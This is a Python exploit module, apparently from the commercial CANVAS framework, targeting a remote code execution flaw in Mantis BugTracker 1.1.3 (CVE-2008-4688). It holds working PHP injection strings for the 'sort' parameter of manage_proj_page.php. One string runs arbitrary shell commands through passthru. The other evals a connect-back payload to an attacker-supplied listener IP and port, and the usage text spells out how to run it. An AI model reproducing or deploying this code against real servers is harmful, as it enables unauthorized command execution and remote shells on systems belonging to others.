#! /usr/bin/env python

# Proprietary CANVAS source code - use only under the license agreement
# specified in LICENSE.txt in your CANVAS distribution
# Copyright Immunity, Inc, 2002-2008
# http://www.immunityinc.com/CANVAS/ for more information
#

import sys
if "." not in sys.path: sys.path.append(".")

from exploitutils import *
from ExploitTypes.php_multi import *

import libs.spkproxy as spkproxy
import canvasengine
import urllib
import re

NAME="Mantis BugTracker => 1.1.3 Remote Code Execution"
DESCRIPTION="Mantis BugTracker => 1.1.3 Remote Code Execution"
DOCUMENTATION={}
DOCUMENTATION['VENDOR']="Mantis"
DOCUMENTATION["Repeatability"]="Infinite"
DOCUMENTATION["CVE Name"]="CVE-2008-4688"
DOCUMENTATION["CVE Url"]="http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2008-4688"
DOCUMENTATION['CVSS'] = 5.0
DOCUMENTATION["References"]=["None"]

VERSION="1.0"

PROPERTY = {}
PROPERTY['TYPE'] = "Web Exploits"
PROPERTY['SITE'] = "Remote"
PROPERTY['ARCH'] = [ ["Linux" ] , ["Windows"] ]
PROPERTY['VERSION'] = [ "All" ]

NOTES="""

"""

CHANGELOG="""
"""

class theexploit(php_multi):
    def __init__(self):
        php_multi.__init__(self)
        self.port=80
        self.host=""
        self.ssl=""
        self.basepath="/"
        self.basepaths=["/mantis-1.1.3/","/bugtracker/","/bugs/","/"]
        self.command=None 
        self.basicauth_user=""
        self.basicauth_password=""
        self.user=""
        self.password=""
        self.hostname=None
        self.foundstrings=["Mantis"]
        self.testfile="login_page.php"

        return 

    def request1(self):

        self.log("[+] Logging In")

        data={}
        data["username"]=self.user
        data["password"]=self.password

        data=self.UA.POST("login.php",data=data)
        self.log("Data=%s"%data)

        self.log("[+] Sending Exploit Data")

        if self.command:
            self.log("[+] Command: %s"%self.command)

            command=self.command
            command=self.conv(command).strip()

            exploit = "']);}error_reporting(0);print(startz);passthru("+command+");print(endz);die;/*"

            data = self.UA.GET("manage_proj_page.php?sort=%s"%(exploit)) 

            if "startz" in data:
                result=data.split("startz")[1].split("endz")[0]
                self.log("Command result: %s"%prettyprint(result))
                ret=1
            else:
                self.log("[-] Command not run - service patched?!")
        else:
            command=self.get_php_to_mosdef()
            command=self.conv(command)

            self.log("[+] Command: %s"%command)

            exploit = "']);}eval("+command+");/*"
            data = self.UA.GET("manage_proj_page.php?sort=%s"%(exploit))
            self.log("Data=%s"%data)
            self.log("[+] Looking for PHP connectback")

            ret=self.ISucceeded()

        return ret

    def usage(self):
        print "Example: "+sys.argv[0]+" -t 172.16.104.128 -p 80 -O user:temp -O password:password -l 10.10.10.227 -d 9898"
        print "-t <target ip>"
        print "-p <target port>                [optional]"
        print "-O basepath: /path/to/mantis/   [optional]"
        print "-O hostname: target vhost       [optional]"
        print "-O command:commandtorun         [optional]"
        print "-O user: forum username"
        print "-O password: forum password"
        print "-l call back ip if doing connect back"
        print "-d listening port for call back"
        return

if __name__ == '__main__':
    print "Running CANVAS %s Exploit v %s"%(DESCRIPTION,VERSION)
    app = theexploit()
    ret=standard_callback_commandline(app)
